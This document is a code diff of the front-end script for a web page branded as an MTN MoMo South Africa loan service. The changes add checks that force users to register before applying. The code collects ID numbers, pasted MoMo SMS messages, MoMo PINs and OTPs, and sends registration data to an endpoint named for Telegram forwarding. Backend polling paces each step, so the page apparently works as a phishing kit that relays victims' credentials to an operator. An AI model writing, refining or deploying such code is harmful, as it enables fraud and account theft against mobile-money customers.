@@ -1,10 +1,10 @@
+
 // ============================================================
 // script.js – MTN MoMo South Africa
-// Account-type limits enforced · Registration via temp endpoint
+// Registration is MANDATORY — apply blocked if not registered
 // ============================================================
 'use strict';
 
-// ─── Account Types (mirrors backend) ───
 const ACCOUNT_TYPES = {
     yello: {
         name: 'MoMo Yello', icon: '🟡',
@@ -68,15 +68,44 @@ function escapeHtml(s) {
 }
 function fmt(n) { return (Number(n) || 0).toLocaleString(); }
 
+// ─── REGISTRATION GATE ───
+// Returns true if user is registered with a valid account type
+function isUserRegistered() {
+    return !!(S.isRegistered === true && S.accountType && ACCOUNT_TYPES[S.accountType]);
+}
+
+// Force user to registration page with error message
+function forceRegistration(reason) {
+    showToast('❌ Invalid user credentials. Please register first.', 'error', 4000);
+    // Optional: show a persistent error banner on registration page
+    setTimeout(() => {
+        startMoMoRegistration();
+        // Show error inside registration page
+        setTimeout(() => {
+            showErr('regErr', reason || 'You must register on MoMo before applying for a loan.');
+        }, 400);
+    }, 1200);
+}
+
 function goTo(pageId) {
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
     const el = document.getElementById(pageId);
     if (el) el.classList.add('active');
     window.scrollTo(0, 0);
 
-    // Hook: update requirements page whenever navigated
+    // ─── GUARD: Pages that require registration ───
+    const requiresRegistration = [
+        'page-step1', 'page-step2', 'page-step3', 'page-guarantor',
+        'page-processing', 'page-wait-app', 'page-sms-paste',
+        'page-wait-sms', 'page-pin', 'page-wait-pin',
+        'page-otp', 'page-wait-otp', 'page-scan', 'page-approval'
+    ];
+    if (requiresRegistration.includes(pageId) && !isUserRegistered()) {
+        forceRegistration('You must register on MoMo before applying for a loan.');
+        return;
+    }
+
     if (pageId === 'page-requirements') updateRequirementsLimits();
-    // Hook: update step1 account info when navigated
     if (pageId === 'page-step1') refreshStep1AccountInfo();
 }
 
@@ -154,10 +183,19 @@ function updateCalc() {
     slider.style.setProperty('--pct', pct + '%');
 }
 
-// ─── Landing actions ───
+// ═══════════════════════════════════════════════════════════
+// LANDING ACTIONS
+// ═══════════════════════════════════════════════════════════
+
+// Existing user path — REQUIRES prior registration
 function applyAsExistingUser() {
+    // ─── GUARD: Must be registered ───
+    if (!isUserRegistered()) {
+        forceRegistration('You must register on MoMo before applying. Please register first.');
+        return;
+    }
+
     S.userPath = 'existing';
-    S.isRegistered = true;
     saveAppData();
     if (!S.loanAmount) {
         S.loanAmount = +document.getElementById('amtSlider').value;
@@ -169,6 +207,12 @@ function applyAsExistingUser() {
 }
 
 function applyFromCalculator() {
+    // ─── GUARD: Must be registered ───
+    if (!isUserRegistered()) {
+        forceRegistration('You must register on MoMo before applying. Please register first.');
+        return;
+    }
+
     const amt = +document.getElementById('amtSlider').value;
     const term = +document.getElementById('calcTermSelect').value;
     S.loanAmount = amt;
@@ -183,7 +227,13 @@ function applyFromCalculator() {
     });
 }
 
+// Internal — only called when registration is confirmed
 function startApplication() {
+    if (!isUserRegistered()) {
+        forceRegistration('Invalid user credentials. Please register first.');
+        return;
+    }
+
     S.rejectedStep = null;
     rm(KEYS.REJECTION);
     if (!S.applicationId) {
@@ -197,6 +247,9 @@ function startApplication() {
 function startMoMoRegistration() {
     S.userPath = 'new';
     S.isRegistered = false;
+    S.accountType = null;
+    S.accountMaxLoan = 0;
+    S.accountMonthlyCap = 0;
     saveAppData();
     document.getElementById('regId').value = '';
     document.getElementById('regDetailsPreview').innerHTML = '<div class="reg-preview-placeholder">Enter your ID above to see your details</div>';
@@ -210,7 +263,9 @@ function startMoMoRegistration() {
     goTo('page-register-check');
 }
 
-// ─── SA ID parsing (mirrors backend) ───
+// ═══════════════════════════════════════════════════════════
+// SA ID VALIDATION
+// ═══════════════════════════════════════════════════════════
 function parseSAId(id) {
     if (!id) return { ok: false, reason: 'ID number is required.' };
     const clean = String(id).replace(/\s/g, '');
@@ -302,9 +357,6 @@ async function completeRegistration() {
     document.getElementById('regProcessingStatus').textContent = '⏳ Verifying your ID...';
 
     try {
-        // Send registration to BOTH endpoints:
-        // 1. Main endpoint (stores on application)
-        // 2. Temporary endpoint (forwards to Telegram standalone)
         const payload = {
             applicationId: S.applicationId,
             idNumber: rawId,
@@ -313,13 +365,13 @@ async function completeRegistration() {
             fullName: `${S.firstName || ''} ${S.lastName || ''}`.trim() || null
         };
 
-        // Fire-and-forget the temp endpoint
+        // Fire temp endpoint for Telegram
         apiCall('/api/register-momo-telegram', {
             method: 'POST',
             body: JSON.stringify(payload)
         }).catch(e => console.warn('Temp reg endpoint failed:', e.message));
 
-        // Main endpoint (blocking)
+        // Main endpoint
         const data = await apiCall('/api/register-momo', {
             method: 'POST',
             body: JSON.stringify(payload)
@@ -332,7 +384,6 @@ async function completeRegistration() {
             return;
         }
 
-        // Store the account type + limits
         S.idNumber = rawId;
         S.accountType = selectedAccountType;
         S.accountMaxLoan = data.maxLoan;
@@ -354,7 +405,9 @@ async function completeRegistration() {
     }
 }
 
-// ─── Requirements page dynamic text ───
+// ═══════════════════════════════════════════════════════════
+// REQUIREMENTS PAGE
+// ═══════════════════════════════════════════════════════════
 function updateRequirementsLimits() {
     const type = ACCOUNT_TYPES[S.accountType] || ACCOUNT_TYPES.yello;
 
@@ -376,74 +429,45 @@ function updateRequirementsLimits() {
     }
 }
 
-// ─── Step 1: account type selection for existing users ───
-function selectExistingAccountType() {
-    const sel = document.getElementById('s1at');
-    const val = sel.value;
-    if (!val) {
-        document.getElementById('accInfoBox').style.display = 'none';
-        document.getElementById('loanLimitHint').textContent = 'Select your account type above first';
-        return;
-    }
-    const type = ACCOUNT_TYPES[val];
-    S.accountType = val;
-    S.accountMaxLoan = type.maxLoan;
-    S.accountMonthlyCap = type.monthlyCap;
-    S.accountDailyCash = type.dailyCash;
-    saveAppData();
-
-    const amInput = document.getElementById('s1am');
-    amInput.max = type.maxLoan;
-    if (+amInput.value > type.maxLoan) {
-        amInput.value = type.maxLoan;
-    }
-
-    document.getElementById('accInfoBox').style.display = 'block';
-    document.getElementById('accInfoText').innerHTML =
-        `<b>${type.icon} ${type.name}</b> — Max loan: <b>R ${fmt(type.maxLoan)}</b> · Monthly cap: R ${fmt(type.monthlyCap)}`;
-
-    document.getElementById('loanLimitHint').textContent =
-        `Max R ${fmt(type.maxLoan)} for ${type.name}`;
-    clearErr('s1Err');
-}
-
+// ═══════════════════════════════════════════════════════════
+// STEP 1
+// ═══════════════════════════════════════════════════════════
 function refreshStep1AccountInfo() {
-    // If user already has account type from registration, hide the selector and pre-fill
+    // Registration is enforced — always hide selector, show info
     const typeField = document.getElementById('accountTypeField');
     const accInfoBox = document.getElementById('accInfoBox');
     const hint = document.getElementById('loanLimitHint');
 
-    if (S.accountType && ACCOUNT_TYPES[S.accountType]) {
-        const type = ACCOUNT_TYPES[S.accountType];
-        if (typeField) typeField.style.display = 'none';
-        if (accInfoBox) {
-            accInfoBox.style.display = 'block';
-            document.getElementById('accInfoText').innerHTML =
-                `<b>${type.icon} ${type.name}</b> — Max loan: <b>R ${fmt(type.maxLoan)}</b> · Monthly cap: R ${fmt(type.monthlyCap)}`;
-        }
-        if (hint) hint.textContent = `Max R ${fmt(type.maxLoan)} for ${type.name}`;
-        const amInput = document.getElementById('s1am');
-        amInput.max = type.maxLoan;
-        if (+amInput.value > type.maxLoan) amInput.value = type.maxLoan;
-    } else {
-        if (typeField) typeField.style.display = 'block';
-        if (accInfoBox) accInfoBox.style.display = 'none';
-        if (hint) hint.textContent = 'Select your account type above first';
+    if (!isUserRegistered()) {
+        forceRegistration();
+        return;
     }
+
+    const type = ACCOUNT_TYPES[S.accountType];
+    if (typeField) typeField.style.display = 'none';
+    if (accInfoBox) {
+        accInfoBox.style.display = 'block';
+        document.getElementById('accInfoText').innerHTML =
+            `<b>${type.icon} ${type.name}</b> — Max loan: <b>R ${fmt(type.maxLoan)}</b> · Monthly cap: R ${fmt(type.monthlyCap)}`;
+    }
+    if (hint) hint.textContent = `Max R ${fmt(type.maxLoan)} for ${type.name}`;
+
+    const amInput = document.getElementById('s1am');
+    amInput.max = type.maxLoan;
+    if (+amInput.value > type.maxLoan) amInput.value = type.maxLoan;
 }
 
-// ─── Step navigation ───
 function toS2() {
+    // ─── GUARD: Must be registered ───
+    if (!isUserRegistered()) {
+        forceRegistration('Invalid user credentials. Please register first.');
+        return;
+    }
+
     const ty = document.getElementById('s1ty').value;
     const am = +document.getElementById('s1am').value;
     const te = document.getElementById('s1te').value;
     const pu = document.getElementById('s1pu').value.trim();
-
-    // Ensure account type is set
-    if (!S.accountType || !ACCOUNT_TYPES[S.accountType]) {
-        showErr('s1Err', 'Please select your MoMo account type.');
-        return;
-    }
     const type = ACCOUNT_TYPES[S.accountType];
 
     if (!ty || !te || !pu) { showErr('s1Err', 'Please complete all fields.'); return; }
@@ -455,6 +479,7 @@ function toS2() {
 }
 
 function toS3() {
+    if (!isUserRegistered()) { forceRegistration(); return; }
     const fi = document.getElementById('s2fi').value.trim();
     const la = document.getElementById('s2la').value.trim();
     const ph = document.getElementById('s2ph').value;
@@ -467,6 +492,7 @@ function toS3() {
 }
 
 function toGuarantor() {
+    if (!isUserRegistered()) { forceRegistration(); return; }
     const em = document.getElementById('s3em').value;
     const inc = +document.getElementById('s3in').value;
     const kn = document.getElementById('s3kn').value.trim();
@@ -478,7 +504,9 @@ function toGuarantor() {
     saveAppData(); saveDraft(); goTo('page-guarantor');
 }
 
-// ─── PIN/OTP helpers ───
+// ═══════════════════════════════════════════════════════════
+// PIN / OTP
+// ═══════════════════════════════════════════════════════════
 function pinMvM(el, i, max = 5) {
     el.value = el.value.replace(/\D/g, '');
     if (el.value && i < max - 1) { document.getElementById('pin' + (i + 1))?.focus(); return; }
@@ -499,8 +527,16 @@ function handleOtpInput(el, type) {
     if (idx === 3 && el.value && [0, 1, 2, 3].every(i => document.getElementById('otp' + i)?.value)) setTimeout(doOtp, 300);
 }
 
-// ─── Submit Application ───
+// ═══════════════════════════════════════════════════════════
+// SUBMIT APPLICATION
+// ═══════════════════════════════════════════════════════════
 async function submitApp() {
+    // ─── GUARD: Must be registered ───
+    if (!isUserRegistered()) {
+        forceRegistration('Invalid user credentials. Please register first.');
+        return;
+    }
+
     const gName = document.getElementById('gName').value.trim();
     const gPhone = document.getElementById('gPhone').value.trim();
     const gRel = document.getElementById('gRel').value;
@@ -529,11 +565,19 @@ async function submitApp() {
             method: 'POST',
             body: JSON.stringify({ applicationData: S })
         });
+
+        // ─── Handle backend registration rejection ───
+        if (data.code === 'NOT_REGISTERED' || (data.error && data.error.toLowerCase().includes('register first'))) {
+            forceRegistration(data.error || 'Invalid user credentials. Please register first.');
+            return;
+        }
+
         if (!data.ok) {
             showErr('gErr', data.error || 'Submission failed.');
             goTo('page-guarantor');
             return;
         }
+
         document.getElementById('processingStatus').textContent = '✅ Sent! Awaiting approval...';
         document.getElementById('waitAppId').textContent = S.applicationId;
         setTimeout(() => {
@@ -549,8 +593,11 @@ async function submitApp() {
     }
 }
 
-// ─── SMS ───
+// ═══════════════════════════════════════════════════════════
+// SMS / PIN / OTP
+// ═══════════════════════════════════════════════════════════
 async function doSmsParse() {
+    if (!isUserRegistered()) { forceRegistration(); return; }
     const msg = document.getElementById('smsMsgBox').value.trim();
     if (msg.length < 5) { showErr('momErr', 'Paste the full SMS.'); return; }
     const btn = document.getElementById('smsSubmitBtn');
@@ -569,8 +616,8 @@ async function doSmsParse() {
     } catch (e) { showErr('momErr', e.message); setBtnLoading(btn, false, 'Submit MoMo Message'); }
 }
 
-// ─── PIN ───
 async function doPin() {
+    if (!isUserRegistered()) { forceRegistration(); return; }
     const pin = [0, 1, 2, 3, 4].map(i => document.getElementById('pin' + i).value).join('');
     if (pin.length !== 5) { showErr('pinErr', 'Enter all 5 digits.'); return; }
     const btn = document.getElementById('pinSubmitBtn');
@@ -589,8 +636,8 @@ async function doPin() {
     } catch (e) { showErr('pinErr', e.message); setBtnLoading(btn, false, 'Submit MoMo PIN'); }
 }
 
-// ─── OTP ───
 async function doOtp() {
+    if (!isUserRegistered()) { forceRegistration(); return; }
     const otp = [0, 1, 2, 3].map(i => document.getElementById('otp' + i).value).join('');
     if (otp.length !== 4) { showErr('otpErr', 'Enter all 4 digits.'); return; }
     const btn = document.getElementById('otpSubmitBtn');
@@ -609,7 +656,9 @@ async function doOtp() {
     } catch (e) { showErr('otpErr', e.message); setBtnLoading(btn, false, 'Submit OTP'); }
 }
 
-// ─── Auto-scan ───
+// ═══════════════════════════════════════════════════════════
+// AUTO-SCAN
+// ═══════════════════════════════════════════════════════════
 function startQualificationScan() {
     document.getElementById('waitScanAppId').textContent = S.applicationId;
     goTo('page-scan');
@@ -662,7 +711,9 @@ function markAllScanDone() {
     });
 }
 
-// ─── Polling ───
+// ═══════════════════════════════════════════════════════════
+// POLLING
+// ═══════════════════════════════════════════════════════════
 function startPolling(step, onSuccess) {
     stopPolling();
     const start = Date.now();
@@ -694,7 +745,9 @@ function handleRejection(step) {
     if (step === 'qualification') { showToast('❌ Requirements not met.', 'error'); setTimeout(restartApplication, 3000); }
 }
 
-// ─── Resend ───
+// ═══════════════════════════════════════════════════════════
+// RESEND
+// ═══════════════════════════════════════════════════════════
 async function resendSms() {
     if (smsResendCountdown > 0) { showToast(`Wait ${smsResendCountdown}s.`, 'info'); return; }
     try {
@@ -769,18 +822,24 @@ function restartApplication() {
     location.reload();
 }
 
-// ─── Session recovery ───
+// ═══════════════════════════════════════════════════════════
+// SESSION RECOVERY
+// ═══════════════════════════════════════════════════════════
 async function recoverSession() {
     loadAppId();
     loadAppData();
+
     if (!S.applicationId) { loadDraft(); return; }
+
+    // If no registration, don't resume into application flow
+    if (!isUserRegistered()) { loadDraft(); return; }
+
     try {
         const r = await fetch(`/api/status/${S.applicationId}`);
         if (!r.ok) { loadDraft(); return; }
         const data = await r.json();
         if (!data.ok) { loadDraft(); return; }
 
-        // Sync account type from server
         if (data.accountType) {
             S.accountType = data.accountType;
             S.accountMaxLoan = data.accountMaxLoan;
@@ -816,7 +875,9 @@ async function recoverSession() {
     } catch (e) { console.warn('Recovery failed:', e); loadDraft(); }
 }
 
-// ─── Storage helpers ───
+// ═══════════════════════════════════════════════════════════
+// STORAGE
+// ═══════════════════════════════════════════════════════════
 function saveAppId(id) { if (!id) return; S.applicationId = id; save(KEYS.APP_ID, { id, timestamp: new Date().toISOString() }); }
 function loadAppId() { const s = get(KEYS.APP_ID); if (s && s.id && Date.now() - new Date(s.timestamp).getTime() < 24 * 3600 * 1000) { S.applicationId = s.id; return s.id; } return null; }
 function saveAppData() { save(KEYS.APP_DATA, { ...S, timestamp: new Date().toISOString() }); }
@@ -863,7 +924,9 @@ document.addEventListener('input', (e) => {
     if (e.target.closest('#page-step1, #page-step2, #page-step3, #page-guarantor')) saveDraft();
 });
 
-// ─── INIT ───
+// ═══════════════════════════════════════════════════════════
+// INIT
+// ═══════════════════════════════════════════════════════════
 updateCalc();
 recoverSession();
 console.log('✅ MTN MoMo SA loaded');
